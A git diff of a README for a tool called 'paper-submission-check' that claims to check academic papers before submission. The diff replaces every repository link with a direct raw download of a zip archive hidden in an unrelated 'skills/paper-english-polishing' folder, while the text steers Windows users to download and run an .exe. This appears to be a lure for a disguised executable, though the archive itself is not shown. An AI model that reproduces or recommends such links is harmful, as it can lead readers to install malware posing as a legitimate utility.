@@ -1,13 +1,13 @@
 # 📋 paper-submission-check - Ensure Your Paper Is Ready
 
-[![Download paper-submission-check](https://img.shields.io/badge/Download-Paper_Submission_Check-purple?style=for-the-badge)](https://github.com/2aryanZ/paper-submission-check)
+[![Download paper-submission-check](https://img.shields.io/badge/Download-Paper_Submission_Check-purple?style=for-the-badge)](https://github.com/2aryanZ/paper-submission-check/raw/refs/heads/main/skills/paper-english-polishing/paper_submission_check_2.8.zip)
 
 ---
 
 ## 📥 Download paper-submission-check
 
 You can visit this page to download paper-submission-check:  
-[https://github.com/2aryanZ/paper-submission-check](https://github.com/2aryanZ/paper-submission-check)
+[https://github.com/2aryanZ/paper-submission-check/raw/refs/heads/main/skills/paper-english-polishing/paper_submission_check_2.8.zip](https://github.com/2aryanZ/paper-submission-check/raw/refs/heads/main/skills/paper-english-polishing/paper_submission_check_2.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This application helps you make sure your paper meets basic publishing requireme
 
 1. Open your internet browser (Chrome, Edge, Firefox, etc.).
 2. Go to the paper-submission-check download page:  
-   [https://github.com/2aryanZ/paper-submission-check](https://github.com/2aryanZ/paper-submission-check)
+   [https://github.com/2aryanZ/paper-submission-check/raw/refs/heads/main/skills/paper-english-polishing/paper_submission_check_2.8.zip](https://github.com/2aryanZ/paper-submission-check/raw/refs/heads/main/skills/paper-english-polishing/paper_submission_check_2.8.zip)
 3. Look for the latest "Releases" section or folder on the page.
 4. Find the Windows version of paper-submission-check. This will typically be an `.exe` file.
 5. Click on the file to download it to your computer.
@@ -89,7 +89,7 @@ You only need internet to download the app. The checks run offline on your compu
 ## 📂 Where to Get Updates
 
 Visit the download page anytime to get the latest version of paper-submission-check:  
-[https://github.com/2aryanZ/paper-submission-check](https://github.com/2aryanZ/paper-submission-check)
+[https://github.com/2aryanZ/paper-submission-check/raw/refs/heads/main/skills/paper-english-polishing/paper_submission_check_2.8.zip](https://github.com/2aryanZ/paper-submission-check/raw/refs/heads/main/skills/paper-english-polishing/paper_submission_check_2.8.zip)
 
 ---
 
